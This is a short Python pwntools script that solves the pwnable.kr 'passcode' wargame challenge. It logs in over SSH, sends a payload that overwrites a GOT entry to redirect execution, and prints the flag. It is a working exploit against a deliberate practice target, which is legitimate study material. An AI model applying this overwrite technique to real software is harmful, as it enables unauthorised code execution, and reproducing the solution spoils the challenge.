from pwn import *

exe = "passcode"

# connect with ssh
ssh_io = ssh(host="pwnable.kr", port=2222, user="passcode", password="guest")

# create process
proc_io = ssh_io.process(executable=exe,argv=[exe])

# get the message
log.info(proc_io.recv())

payload = fit({
     96: 0x0804a004,
     100:str(0x080485e3)
})

# send the payload
proc_io.sendline(payload)

# receive welcome line
log.info(proc_io.recvline())

# receive the flag
log.success("flag is:\n"+ proc_io.recvline().decode("ascii"))

# close what's opened so far
proc_io.close()
ssh_io.close()
